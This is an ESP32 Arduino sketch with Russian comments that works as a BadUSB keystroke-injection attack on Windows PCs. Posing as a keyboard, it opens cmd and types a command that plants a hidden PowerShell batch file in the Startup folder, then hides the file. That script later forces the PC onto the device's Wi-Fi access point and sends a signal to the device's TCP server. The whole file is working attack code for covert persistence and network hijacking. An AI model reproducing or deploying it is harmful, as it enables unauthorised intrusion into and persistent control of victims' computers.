#include <WiFi.h>
#include "USB.h"
#include "USBHIDKeyboard.h"

USBHIDKeyboard kb;
WiFiServer server(80); // TCP сервер на порту 80

void setup() {
  // 1. Настройка пинов
  pinMode(0, INPUT_PULLUP);
  pinMode(LED_RED, OUTPUT); digitalWrite(LED_RED, HIGH);

  // 2. BadUSB: Внедрение скрипта на ПК
  USB.begin();
  kb.begin();
  delay(3000);

  // Открываем Win+R -> cmd
  kb.press(KEY_LEFT_GUI); kb.press('r'); delay(50); kb.releaseAll(); delay(500);
  kb.print("cmd"); kb.write(KEY_RETURN); delay(1000);

  // Формируем скрипт для ПК (PowerShell)
  // Он ждет дату, переключает Wi-Fi на ESP32_AP, коннектится и шлет 'STOP'
  String p1 = "echo powershell -w hidden -c \"while((Get-Date) -lt '2025-01-01 12:00'){sleep 10}; ";
  String p2 = "netsh wlan connect name='ESP32_AP'; sleep 5; ";
  String p3 = "$c=New-Object Net.Sockets.TcpClient('192.168.4.1',80); $s=$c.GetStream(); ";
  String p4 = "$b=[Text.Encoding]::ASCII.GetBytes('STOP'); $s.Write($b,0,4)\" > \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\t.bat\"";

  kb.print(p1); delay(20);
  kb.print(p2); delay(20);
  kb.print(p3); delay(20);
  kb.print(p4); delay(50);
  kb.write(KEY_RETURN); delay(1500); // Ждем создания

  // Скрываем и выходим
  kb.print("attrib +h \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\t.bat\" & exit"); 
  kb.write(KEY_RETURN); delay(1000);

  kb.end(); // Отключаем клавиатуру

  // 3. Переходим в режим точки доступа (AP) и TCP-сервера
  // Создаем сеть ESP32_AP с паролем 12345678
  WiFi.softAP("ESP32_AP", "12345678");
  server.begin();
}

void loop() {
  // Ждем подключения клиента
  WiFiClient client = server.available();

  if (client) {
    if (client.available()) {
      // Читаем 4 байта
      char buf[5] = {0};
      client.readBytes(buf, 4);

      // Если пришло "STOP"
      if (String(buf) == "STOP") {
        digitalWrite(LED_RED, LOW); // Зажигаем красный как индикатор
        // Тут можно сделать что угодно: перезагрузить ESP, подать сигнал на реле и т.д.
        delay(5000);
        digitalWrite(LED_RED, HIGH);
      }
    }
    client.stop();
  }
}
